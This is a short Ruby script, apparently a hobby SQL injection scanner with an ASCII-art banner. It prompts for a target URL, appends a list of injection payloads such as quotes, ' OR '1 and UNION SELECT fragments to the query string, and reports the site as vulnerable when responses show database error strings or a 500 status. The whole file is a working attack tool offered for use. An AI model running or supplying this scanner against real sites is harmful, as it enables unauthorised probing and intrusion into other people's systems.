require 'net/http'
require 'open-uri'

puts """
,-----.  ,------.  ,-----.  ,---.  ,--. ,--.,--. 
|  |) /_ |  .--. ''  .-.  ''   .-' |  .'   /|  | 
|  .-.  \|  '--'.'|  | |  |`.  `-. |  .   ' |  | 
|  '--' /|  |\  \ '  '-'  '.-'    ||  |\   \|  | 
`------' `--' '--' `-----' `-----' `--' '--'`--'                                      
"""

def main(url)
    #Some payloads from https://github.com/payloadbox/sql-injection-payload-list          
    payloads = ["'","''","`","``",",",'"','""',     
            "' OR '1", "' OR '' = '", "'='", "'=0--+",  
            "'''''''''''''UNION SELECT '2", "%00", "||", "+","%"
    ]   

    #Some errors found on ghdb

    errors = ["mysql_num_rows()","You have an error in your SQL syntax",
        "mysql_fetch_array()", "mysql_query()", "Microsoft SQL Native Client error.",
        "unexpected end of SQL command"]
    
    payloads.each do |test|
        target = URI.parse(url)
        target.query += test
        response = Net::HTTP.get_response(target)
        if response.code == "200"
            errors.each do |mhmh|
                if response.body.include?(mhmh)
                    puts "\n#{target.to_s} is vulnerable \n#{mhmh}\n\n"
                end
            end
        elsif response.code == "500"
            puts "\n#{target.to_s} is vulnerable \n(500 internal server error)"
        elsif response.code == "403"
            puts "\n403 forbidden :skull:"
        else
            puts "\nStatus code: "+response.code
        end
    end
end

begin
    print "\nTarget: "
    main(gets.chomp)
rescue NoMethodError
    puts "\nWarning: the target does not appear to have a query"
    puts "Example target: http://testasp.vulnweb.com/showforum.asp?id=0"
rescue => error
    puts error
end
